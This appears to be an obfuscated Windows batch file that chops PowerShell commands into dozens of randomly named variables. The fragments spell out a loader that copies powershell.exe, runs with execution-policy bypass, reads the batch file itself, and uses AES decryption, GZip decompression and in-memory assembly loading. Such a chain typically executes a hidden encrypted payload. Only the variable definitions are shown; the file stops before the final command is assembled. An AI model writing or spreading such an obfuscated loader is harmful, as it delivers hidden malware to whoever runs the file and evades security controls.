@echo off
set "ILLAIImRDT=in"
set "OpTSuTZuej=ll"
set "Lmcpvvhieg=nd"
set "nrvbAGvpgt=\W"
set "QuebSFQGLd=we"
set "tuETfdlHUe=32"
set "iCesMSiLIf=y "
set "bJPeUDqlKr=ow"
set "FuJvSucMDk=s\"
set "ZqYucdDzQa=.e"
set "qITkjDvOzP=xe"
set "tUrOKoJxdT=1."
set "LcAKiVTCQv=ll"
set "CsLHDqDHxb=em"
set "jgfLiyjPLo=he"
set "bYyhjPpYQJ=Sy"
set "jBqlMbfUNM=rs"
set "RYZuoyLrbc=st"
set "JitUugbGcQ= /"
set "WExPqMyjLb=py"
set "csomfYhdAq=:\"
set "mIBOpwtfpl=do"
set "KBzHoTXfif=we"
set "ndwWOkWKgW=ws"
set "FUKCcvDGXs=po"
set "TQshLvhfZX=co"
set "MCKGXYhxvH=he"
set "VnAdsIIelw=Po"
set "uqYdJFnGXN=\v"
set "iBvWGSDvZj=Wi"
set "xskepXwhAm=0\"
set "VxIjdEtxqV= C"
set "npaUgEpOMx=rS"
set "SYINoAUDvq= %~dp0"
set "YJgMIohHZp=cd"
set "YFrormQQSX=PxEW"
set "VgdCwyXnNp=zuZI"
set "mFIOORMPjV=tryP"
set "eJsPzqucym='txe"
set "azRfhAnpIV=TCMA"
set "fjayLzoPHV=rt]:"
set "wJPVLhmfjn=tem."
set "LAgfpDdPLB=ptog"
set "ScOnZNuyoB=FDY."
set "WbTdvfbiiv=..-1"
set "QvBrVfaxXc=rtS4"
set "kpMlmniMnd=daeR"
set "CCxKtteLMI===')"
set "hODPNaHTZY=gMod"
set "cEnsoaCOnW=m.Re"
set "XGkUiQSGHh=trea"
set "xDBCdToWkO=]::C"
set "XyeveHhwZS= if "
set "NcARPqMkMa=.-16"
set "UFMFaTOfPY=gth)"
set "nFxFdPPNxB=ion."
set "RTxoJfxhAT=nage"
set "SfOHsvVPZV=TllA"
set "nwGniHXQQO=PTtG"
set "iHOvzeaviL=join"
set "wSiZdwtRSz=F'[-"
set "dDvBOuTcgA=ypto"
set "mzuishpXAn=A.Pa"
set "ykrPFKocNJ=e = "
set "DZHVUxLXUm=ct S"
set "VJAkqNqDoU=.Len"
set "isLhSZvYqj=gjYA"
set "YTZiuDOYMP=::('"
set "EAwEeBAYTw=wOrr"
set "uWgYLpTNvF=ach "
set "YilLDQpvJN=th('"
set "HWqexwAIbU= = N"
set "TydANMMClp=);$C"
set "NGGEBAZmuP='gni"
set "VmjkZEIxWv=;$zg"
set "gQFKdMHrrX=S46e"
set "doUBqrhKga=]::N"
set "tgNWEtWDxh=Invo"
set "WIPdxovIub=em.C"
set "lWWWvGXGxd=oL'["
set "uwygXKDtVU=ress"
set "TbgpULoJEf=-joi"
set "EukszTvGHO=[Sys"
set "EfcpbHJyDf=lf.T"
set "fPkxnOXgDm=1] -"
set "rBWJQcujVo='[-1"
set "pcSXPREEbP=onve"
set "KVZQntColq=oArr"
set "kadQNdPceh=6esa"
set "pZeNSWdxVI=se()"
set "ZohnlOmuIh=m.IO"
set "bvUZQXxNyD=$GFM"
set "CFTeNLVPxt=);$p"
set "irwtcMWjZN=pose"
set "cpXezdDMiu=$CTC"
set "oGinGVcWgD=.Key"
set "XiDWKtHLwC=null"
set "YoDvbapQRO=Secu"
set "vGEyZXhZcr=t Sy"
set "IPESlOQoye=Ir ="
set "rBcNqDpLmd=ew-O"
set "ZxCFtPiirl=$pGv"
set "DyIbNtZRRe=raph"
set "zGgvICxNQN=comm"
set "icvFqHCFBH=);$k"
set "iCqcshGkzw=and "
set "jXzBPWQgQT=TC.D"
set "UByoGYbRAq=q, 0"
set "PKRfSwMZKu=-1.."
set "JoxNXXDHeK=('%~f0'"
set "JYkFcXMHuk=n ''"
set "GcwtfQlDKi=$mKv"
set "zlvFoFzFfJ=L4Yi"
set "PxZCbLcuMl=[IO."
set "vZVVJKuEuV= '')"
set "VXZwFsSdMr=-joi"
set "hdWpdXVjKT=106u"
set "WoOzGRFlZf=O.Me"
set "NiKyYXBomb=bjec"
set "IiJbhDizJW=mKvx"
set "XwGjkHjWBd=zgFD"
set "EEgfzFUDlm=;$kw"
set "uGcpyeuBwj=$Ozl"
set "ZPUXVSvedc= = $"
set "NOfszHZVUe='[-1"
set "xXZgVxzmdJ=New-"
set "FKviesYxQE=.IO."
set "cCKiyGxfHy=3); "
set "lAUiRrDUpz=..-1"
set "CEAlukEpqr=rity"
set "hMoLvsTVQj=.Mod"
set "mETyWIBmJf=V = "
set "kQUfwMJyXR=Orr."
set "hVbxMpSSTk=tem."
set "ifdjHwguNx=TCMA"
set "DOMdFxQkAf=, (,"
set "TnxBDhFlEG=Urew"
set "BcgUhBAqVp=in $"
